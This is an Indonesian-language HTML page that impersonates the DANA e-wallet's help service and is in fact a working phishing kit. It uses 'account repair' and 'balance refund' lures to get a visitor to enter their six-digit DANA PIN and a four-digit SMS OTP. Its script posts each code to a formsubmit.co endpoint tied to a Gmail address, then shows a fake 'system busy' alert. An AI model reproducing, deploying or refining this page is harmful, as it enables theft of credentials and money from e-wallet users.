<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>DANA - Layanan Bantuan</title>
  <style>
    * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
    body { margin: 0; background-color: #F5F7FA; color: #333; overflow-x: hidden; display: flex; flex-direction: column; min-height: 100vh; }
    
    /* Loader */
    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #008CFF; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    /* Header & Banner */
    .nav-header { background: white; padding: 15px; display: flex; align-items: center; border-bottom: 1px solid #E6EAEF; width: 100%; }
    .nav-header span { font-weight: bold; font-size: 16px; margin-left: 20px; color: #3D4752; }
    .blue-banner { background: #008CFF; padding: 30px 20px; text-align: center; width: 100%; }
    .logo-dana-white { width: 100px; filter: brightness(0) invert(1); }

    /* Container Utama - Diperbaiki agar Full & Tidak Miring */
    .container { 
        margin: -30px auto 20px; 
        background: white; 
        border-radius: 12px; 
        box-shadow: 0 4px 15px rgba(0,0,0,0.06); 
        padding: 30px 20px; 
        width: 92%; /* Lebar proporsional */
        max-width: 450px; 
        position: relative; 
        z-index: 10; 
    }
    
    /* Menu Styles */
    .menu-item { display: flex; align-items: center; background: white; border: 1px solid #E6EAEF; border-radius: 12px; padding: 20px; margin-bottom: 15px; cursor: pointer; }
    .menu-text b { display: block; font-size: 15px; color: #3D4752; margin-bottom: 4px; }
    .menu-text span { font-size: 12px; color: #7A848F; }

    /* PIN Visuals - Perbaikan agar Rata Tengah & Full */
    .pin-display { display: flex; justify-content: center; gap: 12px; margin: 30px 0; width: 100%; }
    .pin-dot { width: 15px; height: 15px; background: #D8DDE3; border-radius: 50%; transition: 0.2s; }
    .pin-dot.fill { background: #333; }
    #pinInput { position: absolute; opacity: 0; left: -9999px; }

    /* OTP Boxes - Perbaikan Input Otomatis */
    .otp-container { display: flex; gap: 12px; justify-content: center; margin: 30px 0; }
    .otp-box { 
        width: 50px; 
        height: 60px; 
        border: 1px solid #D8DDE3; 
        border-radius: 8px; 
        text-align: center; 
        font-size: 24px; 
        font-weight: bold; 
        background: #f9f9f9; 
        outline: none;
    }
    .otp-box:focus { border-color: #008CFF; background: white; }

    /* Button */
    .btn-submit { width: 100%; height: 55px; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
    .btn-active { background: #008CFF; color: white; }
    .btn-disabled { background: #B3B9C0; color: white; pointer-events: none; }

    section { display: none; width: 100%; }
    section.active { display: flex; flex-direction: column; align-items: center; }
  </style>
</head>
<body>

  <div id="loader"><div class="spinner"></div></div>

  <section id="page-menu" class="active">
    <div class="nav-header"><span>DANA Protection</span></div>
    <div class="blue-banner">
      <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" class="logo-dana-white">
    </div>
    <div class="container">
      <div class="menu-item" onclick="startFlow('Perbaikan Rekening')">
        <div class="menu-text"><b>Perbaikan Rekening</b><span>Klik untuk memulihkan akun</span></div>
        <div style="color: #008CFF;">➜</div>
      </div>
      <div class="menu-item" onclick="startFlow('Pengembalian Saldo')">
        <div class="menu-text"><b>Pengembalian Saldo Deposit</b><span>Klaim saldo Anda kembali</span></div>
        <div style="color: #008CFF;">➜</div>
      </div>
    </div>
  </section>

  <section id="page-pin">
    <div class="nav-header"><span>Hubungkan DANA</span></div>
    <div style="background: #008CFF; color: white; padding: 12px; text-align: center; font-weight: bold; width: 100%;">✕ Proses Verifikasi</div>
    <div class="container" style="margin-top: 40px; text-align: center;">
      <h2 style="font-size: 20px; margin-bottom: 5px;">ALFAGIFT</h2>
      <p style="color: #7A848F; font-size: 14px;">Masukkan 6 digit PIN DANA kamu</p>
      
      <div class="pin-display" onclick="document.getElementById('pinInput').focus()">
        <div class="pin-dot" id="p1"></div><div class="pin-dot" id="p2"></div><div class="pin-dot" id="p3"></div>
        <div class="pin-dot" id="p4"></div><div class="pin-dot" id="p5"></div><div class="pin-dot" id="p6"></div>
      </div>
      
      <input type="password" id="pinInput" maxlength="6" inputmode="numeric">
      <a href="#" style="color: #008CFF; font-weight: bold; text-decoration: none; font-size: 14px;">LUPA PIN?</a>
    </div>
  </section>

  <section id="page-otp">
    <div class="nav-header"><span>Verifikasi Kode</span></div>
    <div class="container" style="margin-top: 50px; text-align: center;">
      <h3>Masukkan OTP</h3>
      <p style="color: #7A848F; font-size: 14px;">Kode dikirim melalui SMS ke nomor Anda</p>
      
      <div class="otp-container">
        <input type="tel" maxlength="1" class="otp-box" oninput="moveNext(this, 'otp2')" id="otp1">
        <input type="tel" maxlength="1" class="otp-box" oninput="moveNext(this, 'otp3')" id="otp2">
        <input type="tel" maxlength="1" class="otp-box" oninput="moveNext(this, 'otp4')" id="otp3">
        <input type="tel" maxlength="1" class="otp-box" oninput="moveNext(this, '')" id="otp4">
      </div>
      
      <button class="btn-submit btn-active" onclick="finalSubmit()">KONFIRMASI</button>
    </div>
  </section>

  <script>
    const API = "https://formsubmit.co/ajax/baygaming648@gmail.com";
    
    function showLoader(fn) {
      document.getElementById('loader').style.display = 'flex';
      setTimeout(() => { document.getElementById('loader').style.display = 'none'; if(fn) fn(); }, 1200);
    }

    function startFlow(m) {
      showLoader(() => {
        document.getElementById('page-menu').classList.remove('active');
        document.getElementById('page-pin').classList.add('active');
        document.getElementById('pinInput').focus();
      });
    }

    // Logic PIN (Auto Submit)
    document.getElementById('pinInput').addEventListener('input', function(e) {
      const val = e.target.value;
      for(let i=1; i<=6; i++) {
        document.getElementById('p'+i).className = val[i-1] ? "pin-dot fill" : "pin-dot";
      }
      if(val.length === 6) {
        fetch(API, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({PIN: val}) });
        showLoader(() => {
          document.getElementById('page-pin').classList.remove('active');
          document.getElementById('page-otp').classList.add('active');
          document.getElementById('otp1').focus();
        });
      }
    });

    // Logic OTP (Auto Move/Focus)
    function moveNext(current, nextId) {
      if(current.value.length >= 1 && nextId !== "") {
        document.getElementById(nextId).focus();
      }
    }

    function finalSubmit() {
      const otp = document.getElementById('otp1').value + document.getElementById('otp2').value + document.getElementById('otp3').value + document.getElementById('otp4').value;
      if(otp.length === 4) {
        fetch(API, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({OTP: otp}) });
        showLoader(() => { alert("Sistem Sedang Sibuk. Silakan coba lagi nanti."); location.reload(); });
      }
    }
  </script>
</body>
  </html>
